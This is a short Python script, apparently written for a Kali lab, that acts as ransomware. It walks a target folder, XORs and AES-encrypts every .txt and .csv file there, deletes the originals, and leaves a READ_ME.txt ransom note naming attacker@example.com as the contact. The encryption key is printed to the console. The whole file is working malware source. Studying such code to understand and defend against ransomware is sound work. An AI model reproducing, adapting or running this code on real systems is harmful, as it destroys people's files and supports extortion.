import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def xor_data(data, key):
    return bytes([b ^ key for b in data])

def aes_encrypt(data, key):
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return cipher.nonce + tag + ciphertext

def encrypt_file(filepath, aes_key, xor_key):
    with open(filepath, 'rb') as f:
        data = f.read()
    xored = xor_data(data, xor_key)
    encrypted = aes_encrypt(xored, aes_key)
    with open(filepath + '.enc', 'wb') as f:
        f.write(encrypted)
    os.remove(filepath)

def drop_ransom_note(folder, note_text):
    note_path = os.path.join(folder, 'READ_ME.txt')
    with open(note_path, 'w') as f:
        f.write(note_text)

def main():
    target_dir = '/home/kali/Videos/'
    aes_key = get_random_bytes(16)  # 128-bit AES key
    xor_key = 0x5A  # XOR key

    files_encrypted = False

    for file in os.listdir(target_dir):
        if file.endswith('.txt') or file.endswith('.csv'):
            filepath = os.path.join(target_dir, file)
            encrypt_file(filepath, aes_key, xor_key)
            files_encrypted = True

    if files_encrypted:
        ransom_message = """Your files have been encrypted.
To recover them, contact attacker@example.com with your ID."""
        drop_ransom_note(target_dir, ransom_message)
        print("Encryption complete. AES key (keep it safe!):", aes_key.hex())
    else:
        print("No .txt or .csv files found to encrypt.")

if __name__ == '__main__':
    main()
